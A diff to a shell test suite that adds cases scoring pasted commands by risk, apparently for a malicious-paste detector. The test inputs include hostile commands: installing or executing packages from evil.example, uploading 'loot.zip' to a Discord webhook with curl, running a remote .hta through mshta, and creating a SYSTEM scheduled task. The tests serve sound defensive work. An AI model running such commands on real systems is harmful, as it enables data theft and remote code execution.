@@ -410,6 +410,11 @@ jcheck "P8 multi-hold keeps single top-tier score" 'd["score"] == 65' paste 'pow
 jcheck "P8 tier: host primitive scores 55" 'd["score"] == 55' paste 'schtasks /create /ru SYSTEM /tn t /tr c'
 jcheck "P8 tier: read-only enum stays 45" 'd["score"] == 45' paste 'find . -perm 4000'
 jcheck "P8 tier: mixed hits take max severity + label" 'd["score"] == 55 and "schtasks" in d["reasons"][0]' paste 'komga && schtasks /create /ru SYSTEM /tn t /tr c'
+jcheck "P8 tier: remote package install scores 65" 'd["score"] == 65' paste 'brew install http://evil.example/pkg'
+jcheck "P8 tier: npx remote package exec scores 65" 'd["score"] == 65' paste 'npx http://evil.example/tool'
+jcheck "P8 tier: file-upload exfil scores 55" 'd["score"] == 55' paste 'curl -X POST -F "file=@loot.zip" https://discord.com/api/webhooks/1/x'
+jcheck "P8: defanged hxxps still counts as remote" 'd["score"] == 65' paste 'mshta.exe hxxps://files.example.net/captcha.hta'
+jcheck "P8: benign pkg-mgr install stays ALERT band" 'd["score"] == 45' paste 'brew install wget'
 
 # P8 (also:) overflow guard: 5 hits with 105-141-char labels must not
 # smash extra[192] — cycle-439 fixed a would-be-length advance that
